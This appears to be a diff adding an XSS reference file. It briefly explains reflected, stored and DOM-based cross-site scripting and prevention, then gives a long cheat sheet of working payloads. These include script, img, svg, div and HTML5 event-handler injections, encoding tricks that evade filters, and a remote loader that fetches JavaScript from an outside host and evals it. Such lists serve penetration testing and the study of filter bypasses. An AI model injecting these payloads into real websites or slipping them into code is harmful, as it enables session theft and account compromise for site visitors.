@@ -1,0 +1,93 @@
+Vulnerability Details
+Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.
+
+There are 3 main types of XSS attacks:
+
+Reflected XSS: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.
+
+Stored XSS: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.
+
+DOM-based XSS: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.
+
+To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.
+
+Exploit code or POC
+
+
+XSS in HTML/Applications
+Common Payloads
+// Basic payload
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+
+// Img payload
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<><img src=1 onerror=alert(1)>
+
+// Svg payload
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
+
+// Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
+XSS using HTML5 tags
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+
+<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
+<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
+<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
+XSS using a remote JS
+<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
+<script src=14.rs>
+// you can also specify an arbitrary payload with 14.rs/#payload
+e.g: 14.rs/#alert(document.domain)
+XSS in hidden input
+<input type="hidden" accesskey="X" onclick="alert(1)">
+Use CTRL+SHIFT+X to trigger the onclick event
+XSS when payload is reflected capitalized
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
+DOM based XSS
+Based on a DOM XSS sink.
+
+#"><img src=/ onerror=alert(2)>
+XSS in JS Context
+-(confirm)(document.domain)//
+; alert(1);//
+// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
